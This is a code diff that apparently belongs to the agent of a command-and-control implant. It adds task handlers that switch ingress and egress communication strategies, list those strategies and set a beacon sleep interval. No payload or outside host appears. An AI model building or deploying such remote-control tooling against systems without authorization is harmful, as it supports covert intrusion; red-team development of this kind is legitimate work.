@@ -4,6 +4,7 @@
 #include "../modules/cd.h"
 #include "../modules/ls.h"
 #include "../data/msgpack/msgpack.h"
+#include "settings.h"
 
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
@@ -31,17 +32,66 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     //do the tasks - no switch cuz c++ doesn;t support std;:string case switch
     if (task_name == "strat get") {
         nlohmann::json result;
-        add_text_result(result, "error", "Strat Get Not Implemented");
+
+        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
+        std::string comms_get_function = task_data["task"]["args"]["strategy_name"];
+        
+        SettingsManager::instance().set("comms_get_function", comms_get_function);
+
+        add_text_result(result, "message", "Comms Get Function set to: " + comms_get_function);
+        add_text_result(result, "value", comms_get_function);
+
         return result;
     }
     else if (task_name == "strat post") {
         nlohmann::json result;
-        add_text_result(result, "error", "Strat Post Not Implemented");
+
+        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
+        std::string comms_post_function = task_data["task"]["args"]["strategy_name"];
+        
+        SettingsManager::instance().set("comms_post_function", comms_post_function);
+
+        add_text_result(result, "message", "Comms Post Function set to: " + comms_post_function);
+        add_text_result(result, "value", comms_post_function);
+
         return result;
     }
+    else if (task_name == "strat list") {
+        nlohmann::json result;
+
+        std::string output = "";
+
+        //move me to strat.cpp or something, this is just a placeholder to show the concept.
+        std::map<std::string, IngressFunc> get_map = SettingsManager::instance().get<std::map<std::string, IngressFunc>>("comms_get_strat_map", {});
+        std::map<std::string, EgressFunc> post_map = SettingsManager::instance().get<std::map<std::string, EgressFunc>>("comms_post_strat_map", {});
+
+        // Loop through Ingress Map
+        for (const auto& [name, func] : get_map) {
+            output += name + "\n";
+        }
+
+        // Loop through Egress Map
+        for (const auto& [name, func] : post_map) {
+            output += name + "\n";
+        }
+
+        add_text_result(result, "message", "Available Strategies:");
+        add_text_result(result, "value", output);
+
+        return result;
+    }
+
     else if (task_name == "sleep") {
         nlohmann::json result;
-        add_text_result(result, "error", "Sleep Not Implemented");
+
+        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
+        int sleep_time = task_data["task"]["args"]["sleep_time"];
+        
+        SettingsManager::instance().set("sleep_time", sleep_time);
+
+        add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
+        add_text_result(result, "value", std::to_string(sleep_time));
+
         return result;
     }
     else if (task_name == "ls") {
